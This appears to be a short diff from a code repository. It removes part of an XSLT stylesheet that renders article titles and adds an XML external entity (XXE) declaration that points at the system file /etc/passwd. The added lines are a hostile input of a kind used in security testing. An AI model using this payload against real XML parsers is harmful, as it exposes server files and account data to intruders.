@@ -1,5 +1,4 @@
-<xsl:template match="/ARTICLE/TITLE">
- <h1 align="center"> 
-    <xsl:apply-templates/> </h1>
- </xsl:template>
-</xsl:stylesheet>
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE request [
+    <!ENTITY include SYSTEM "/etc/passwd">
+]>
